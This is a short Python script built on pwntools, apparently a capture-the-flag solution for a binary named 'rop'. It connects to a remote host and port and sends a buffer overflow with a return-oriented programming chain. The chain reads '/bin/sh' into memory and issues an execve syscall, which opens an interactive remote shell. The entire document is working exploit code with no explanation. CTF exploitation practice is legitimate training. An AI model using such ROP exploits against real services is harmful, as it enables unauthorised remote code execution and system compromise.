from pwn import *

ip = "140.110.112.77"
port = 2113

context.arch = "amd64"

r = remote(ip, port)
# r = process("./rop")

read = 0x43f5c0
data = 0x6cc000 - 0x100
pop_rdx_rsi = 0x442a19
pop_rdi = 0x4014f6
pop_rax = 0x44f6cc
syscall = 0x4003da

payload = b""
payload += b"\x00".ljust(40)
payload += flat(pop_rdi, 0, pop_rdx_rsi, 0x10, data, read)
payload += flat(pop_rax, 0x3b, pop_rdi, data, pop_rdx_rsi, 0, 0, syscall)

r.sendlineafter(".", payload)

import time
time.sleep(0.5)

r.sendline("/bin/sh\x00")

r.interactive()
